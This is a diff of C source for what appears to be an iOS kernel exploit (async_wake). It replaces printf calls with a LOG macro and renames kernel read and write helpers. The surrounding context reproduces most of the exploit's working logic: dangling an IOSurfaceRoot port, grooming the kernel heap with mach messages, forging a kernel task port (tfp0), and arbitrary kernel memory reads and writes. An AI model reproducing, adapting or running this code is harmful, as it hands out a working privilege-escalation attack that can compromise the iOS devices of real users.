@@ -16,6 +16,8 @@
 #include "offsets.h"
 #include "early_kalloc.h"
 
+#include <common.h>
+
 // various prototypes and structure definitions for missing iOS headers:
 
 kern_return_t mach_vm_read(
@@ -125,7 +127,7 @@ void make_dangling(mach_port_t port) {
                                    outputStruct,
                                    &outputStructCnt);
     
-    printf("%x\n", err);
+    LOG("%x\n", err);
   };
   
   err = IOConnectCallMethod(
@@ -140,7 +142,7 @@ void make_dangling(mach_port_t port) {
                             outputStruct,
                             &outputStructCnt);
   
-  printf("%x\n", err);
+  LOG("%x\n", err);
 }
 
 static void prepare_user_client() {
@@ -148,17 +150,17 @@ static void prepare_user_client() {
   io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
   
   if (service == IO_OBJECT_NULL){
-    printf(" [-] unable to find service\n");
+    LOG(" [-] unable to find service\n");
     exit(EXIT_FAILURE);
   }
   
   err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
   if (err != KERN_SUCCESS){
-    printf(" [-] unable to get user client connection\n");
+    LOG(" [-] unable to get user client connection\n");
     exit(EXIT_FAILURE);
   }
   
-  printf("got user client: 0x%x\n", user_client);
+  LOG("got user client: 0x%x\n", user_client);
 }
 
 mach_port_t* prepare_ports(int n_ports) {
@@ -167,7 +169,7 @@ mach_port_t* prepare_ports(int n_ports) {
     kern_return_t err;
     err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
     if (err != KERN_SUCCESS) {
-      printf(" [-] failed to allocate port\n");
+      LOG(" [-] failed to allocate port\n");
       exit(EXIT_FAILURE);
     }
   }
@@ -196,7 +198,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
   kern_return_t err;
   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
   if (err != KERN_SUCCESS) {
-    printf(" [-] failed to allocate port\n");
+    LOG(" [-] failed to allocate port\n");
     exit(EXIT_FAILURE);
   }
   
@@ -208,7 +210,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
                                  (mach_port_info_t)&limits,
                                  MACH_PORT_LIMITS_INFO_COUNT);
   if (err != KERN_SUCCESS) {
-    printf(" [-] failed to increase queue limit\n");
+    LOG(" [-] failed to increase queue limit\n");
     exit(EXIT_FAILURE);
   }
   
@@ -234,7 +236,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
                    MACH_PORT_NULL);
     
     if (err != KERN_SUCCESS) {
-      printf(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
+      LOG(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
       exit(EXIT_FAILURE);
     }
   }
@@ -323,7 +325,7 @@ uint8_t* build_message_payload(uint64_t dangling_port_address, uint32_t message_
   // pointer up there it's actually all in the buffer so we can also set the reference count to leak it, let's double check that!
 
   if (fake_port + fake_task_offset < body) {
-    printf("the maths is wrong somewhere, fake task doesn't fit in message\n");
+    LOG("the maths is wrong somewhere, fake task doesn't fit in message\n");
     sleep(10);
     exit(EXIT_FAILURE);
   }
@@ -357,13 +359,13 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   mach_port_t tfp0 = MACH_PORT_NULL;
   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp0);
   if (err != KERN_SUCCESS) {
-    printf("unable to allocate port\n");
+    LOG("unable to allocate port\n");
   }
   
   // build a fake struct task for the kernel task:
   //uint64_t fake_kernel_task_kaddr = kmem_alloc_wired(0x4000);
   uint64_t fake_kernel_task_kaddr = early_kalloc(0x1000);
-  printf("fake_kernel_task_kaddr: %llx\n", fake_kernel_task_kaddr);
+  LOG("fake_kernel_task_kaddr: %llx\n", fake_kernel_task_kaddr);
 
   
   void* fake_kernel_task = malloc(0x1000);
@@ -375,30 +377,30 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   kmemcpy(fake_kernel_task_kaddr, (uint64_t) fake_kernel_task, 0x1000);
   free(fake_kernel_task);
   
-  uint32_t fake_task_refs = rk32(fake_kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT));
-  printf("read fake_task_refs: %x\n", fake_task_refs);
+  uint32_t fake_task_refs = ReadAnywhere32(fake_kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT));
+  LOG("read fake_task_refs: %x\n", fake_task_refs);
   if (fake_task_refs != 0xd00d) {
-    printf("read back value didn't match...\n");
+    LOG("read back value didn't match...\n");
   }
   
   // now make the changes to the port object to make it a task port:
   uint64_t port_kaddr = find_port_address(tfp0, MACH_MSG_TYPE_MAKE_SEND);
   
-  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
-  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
-  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
-  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
-  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  fake_kernel_task_kaddr);
+  WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
+  WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
+  WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
+  WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
+  WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  fake_kernel_task_kaddr);
   
   // swap our receive right for a send right:
   uint64_t task_port_addr = task_self_addr();
-  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+  uint64_t task_addr = ReadAnywhere64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  uint64_t itk_space = ReadAnywhere64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+  uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
   
   uint32_t port_index = tfp0 >> 8;
   const int sizeof_ipc_entry_t = 0x18;
-  uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
+  uint32_t bits = ReadAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
 
 #define IE_BITS_SEND (1<<16)
 #define IE_BITS_RECEIVE (1<<17)
@@ -406,24 +408,24 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   bits &= (~IE_BITS_RECEIVE);
   bits |= IE_BITS_SEND;
   
-  wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
+  WriteAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
   
-  printf("about to test new tfp0\n");
+  LOG("about to test new tfp0\n");
   
   vm_offset_t data_out = 0;
   mach_msg_type_number_t out_size = 0;
   err = mach_vm_read(tfp0, vm_map, 0x40, &data_out, &out_size);
   if (err != KERN_SUCCESS) {
-    printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
+    LOG("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
     sleep(3);
     exit(EXIT_FAILURE);
   }
 
-  printf("kernel read via second tfp0 port worked?\n");
-  printf("0x%016llx\n", *(uint64_t*)data_out);
-  printf("0x%016llx\n", *(uint64_t*)(data_out+8));
-  printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
-  printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
+  LOG("kernel read via second tfp0 port worked?\n");
+  LOG("0x%016llx\n", *(uint64_t*)data_out);
+  LOG("0x%016llx\n", *(uint64_t*)(data_out+8));
+  LOG("0x%016llx\n", *(uint64_t*)(data_out+0x10));
+  LOG("0x%016llx\n", *(uint64_t*)(data_out+0x18));
   
   return tfp0;
 }
@@ -432,22 +434,22 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
 
 // task_self_addr points to the struct ipc_port for our task port
 uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
-  uint64_t struct_task = rk64(task_self_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  uint64_t struct_task = ReadAnywhere64(task_self_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
   
   while (struct_task != 0) {
-    uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+    uint64_t bsd_info = ReadAnywhere64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
     
-    uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+    uint32_t pid = ReadAnywhere32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
     
     if (pid == 0) {
-      uint64_t vm_map = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+      uint64_t vm_map = ReadAnywhere64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
       return vm_map;
     }
     
-    struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+    struct_task = ReadAnywhere64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
   }
   
-  printf("unable to find kernel task...\n");
+  LOG("unable to find kernel task...\n");
   sleep(10);
   exit(EXIT_FAILURE);
 }
@@ -465,17 +467,17 @@ mach_port_t get_kernel_memory_rw() {
   uint32_t replacer_body_size = message_size_for_kalloc_size(4096) - sizeof(mach_msg_header_t);
   uint32_t message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;
   
-  printf("message size for kalloc.4096: %d\n", message_size_for_kalloc_size(4096));
+  LOG("message size for kalloc.4096: %d\n", message_size_for_kalloc_size(4096));
   
   prepare_user_client();
   
   uint64_t task_self = task_self_addr();
   if (task_self == 0) {
-    printf("unable to disclose address of our task port\n");
+    LOG("unable to disclose address of our task port\n");
     sleep(10);
     exit(EXIT_FAILURE);
   }
-  printf("our task port is at 0x%llx\n", task_self);
+  LOG("our task port is at 0x%llx\n", task_self);
   
   int n_pre_ports = 100000; //8000
   mach_port_t* pre_ports = prepare_ports(n_pre_ports);
@@ -512,7 +514,7 @@ mach_port_t get_kernel_memory_rw() {
     uint64_t candidate_address = find_port_address(candidate_port, MACH_MSG_TYPE_MAKE_SEND);
     uint64_t page_offset = candidate_address & 0xfff;
     if (page_offset > 0xa00 && page_offset < 0xe80) { // this range could be wider but there's no need
-      printf("found target port with suitable allocation page offset: 0x%016llx\n", candidate_address);
+      LOG("found target port with suitable allocation page offset: 0x%016llx\n", candidate_address);
       pre_ports[base+i] = MACH_PORT_NULL;
       first_port = candidate_port;
       first_port_address = candidate_address;
@@ -521,15 +523,15 @@ mach_port_t get_kernel_memory_rw() {
   }
   
   if (first_port == MACH_PORT_NULL) {
-    printf("unable to find a candidate port with a suitable page offset\n");
+    LOG("unable to find a candidate port with a suitable page offset\n");
     exit(EXIT_FAILURE);
   }
 
   
   uint64_t* context_ptr = NULL;
   uint8_t* replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, 0, 0, &context_ptr);
-  printf("replacer_body_size: 0x%x\n", replacer_body_size);
-  printf("message_body_offset: 0x%x\n", message_body_offset);
+  LOG("replacer_body_size: 0x%x\n", replacer_body_size);
+  LOG("message_body_offset: 0x%x\n", message_body_offset);
   
   make_dangling(first_port);
   
@@ -555,7 +557,7 @@ mach_port_t get_kernel_memory_rw() {
     // we want the GC to actually finish, so go slow...
     pthread_yield_np();
     usleep(10000);
-    printf("%d\n", i);
+    LOG("%d\n", i);
   }
   
 
@@ -563,23 +565,23 @@ mach_port_t get_kernel_memory_rw() {
   mach_port_context_t replacer_port_number = 0;
   err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);
   if (err != KERN_SUCCESS) {
-    printf("unable to get context: %d %s\n", err, mach_error_string(err));
+    LOG("unable to get context: %d %s\n", err, mach_error_string(err));
     sleep(3);
     exit(EXIT_FAILURE);
   }
   replacer_port_number &= 0xffffffff;
   if (replacer_port_number >= (uint64_t)replacer_ports_limit) {
-    printf("suspicious context value, something's wrong %lx\n", replacer_port_number);
+    LOG("suspicious context value, something's wrong %lx\n", replacer_port_number);
     sleep(3);
     exit(EXIT_FAILURE);
   }
   
-  printf("got replaced with replacer port %ld\n", replacer_port_number);
+  LOG("got replaced with replacer port %ld\n", replacer_port_number);
 
   prepare_rk_via_kmem_read_port(first_port);
   
   uint64_t kernel_vm_map = find_kernel_vm_map(task_self);
-  printf("found kernel vm_map: 0x%llx\n", kernel_vm_map);
+  LOG("found kernel vm_map: 0x%llx\n", kernel_vm_map);
   
   
   // now free first replacer and put a fake kernel task port there
@@ -607,19 +609,19 @@ mach_port_t get_kernel_memory_rw() {
   replacer_port_number = 0;
   err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);
   if (err != KERN_SUCCESS) {
-    printf("unable to get context: %d %s\n", err, mach_error_string(err));
+    LOG("unable to get context: %d %s\n", err, mach_error_string(err));
     sleep(3);
     exit(EXIT_FAILURE);
   }
   
   replacer_port_number &= 0xffffffff;
   if (replacer_port_number >= (uint64_t)n_second_replacer_ports) {
-    printf("suspicious context value, something's wrong %lx\n", replacer_port_number);
+    LOG("suspicious context value, something's wrong %lx\n", replacer_port_number);
     sleep(3);
     exit(EXIT_FAILURE);
   }
   
-  printf("second time got replaced with replacer port %ld\n", replacer_port_number);
+  LOG("second time got replaced with replacer port %ld\n", replacer_port_number);
   
   // clear up the original replacer ports:
   for (int i = 0; i < replacer_ports_limit; i++) {
@@ -633,25 +635,25 @@ mach_port_t get_kernel_memory_rw() {
     mach_port_destroy(mach_task_self(), second_replacer_ports[i]);
   }
   
-  printf("will try to read from second port (fake kernel)\n");
+  LOG("will try to read from second port (fake kernel)\n");
   // try to read some kernel memory using the second port:
   vm_offset_t data_out = 0;
   mach_msg_type_number_t out_size = 0;
   err = mach_vm_read(first_port, kernel_vm_map, 0x40, &data_out, &out_size);
   if (err != KERN_SUCCESS) {
-    printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
+    LOG("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
     sleep(3);
     exit(EXIT_FAILURE);
   }
   
-  printf("kernel read via fake kernel task port worked?\n");
-  printf("0x%016llx\n", *(uint64_t*)data_out);
-  printf("0x%016llx\n", *(uint64_t*)(data_out+8));
-  printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
-  printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
+  LOG("kernel read via fake kernel task port worked?\n");
+  LOG("0x%016llx\n", *(uint64_t*)data_out);
+  LOG("0x%016llx\n", *(uint64_t*)(data_out+8));
+  LOG("0x%016llx\n", *(uint64_t*)(data_out+0x10));
+  LOG("0x%016llx\n", *(uint64_t*)(data_out+0x18));
   
   prepare_rwk_via_tfp0(first_port);
-  printf("about to build safer tfp0\n");
+  LOG("about to build safer tfp0\n");
   
   //early_kalloc(0x10000);
   //return 0;
@@ -659,36 +661,36 @@ mach_port_t get_kernel_memory_rw() {
   mach_port_t safer_tfp0 = build_safe_fake_tfp0(kernel_vm_map, ipc_space_kernel());
   prepare_rwk_via_tfp0(safer_tfp0);
   
-  printf("built safer tfp0\n");
-  printf("about to clear up\n");
+  LOG("built safer tfp0\n");
+  LOG("about to clear up\n");
   
   // can now clean everything up
-  wk32(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_NONE);
-  wk64(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  0);
+  WriteAnywhere32(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_NONE);
+  WriteAnywhere64(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  0);
   
   // first port will soon point to freed memory, so neuter it:
   uint64_t task_port_addr = task_self_addr();
-  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+  uint64_t task_addr = ReadAnywhere64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  uint64_t itk_space = ReadAnywhere64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+  uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
   
   uint32_t port_index = first_port >> 8;
   const int sizeof_ipc_entry_t = 0x18;
   
   // remove all rights
-  wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
+  WriteAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
   
   // clear the ipc_port port too
-  wk64(is_table + (port_index * sizeof_ipc_entry_t), 0);
+  WriteAnywhere64(is_table + (port_index * sizeof_ipc_entry_t), 0);
   
   mach_port_destroy(mach_task_self(), second_replacement_port);
-  printf("cleared up\n");
+  LOG("cleared up\n");
   return safer_tfp0;
 }
 
 
 void async_wake_go() {
   mach_port_t tfp0 = get_kernel_memory_rw();
-  printf("tfp0: %x\n", tfp0);
+  LOG("tfp0: %x\n", tfp0);
   return;
 }
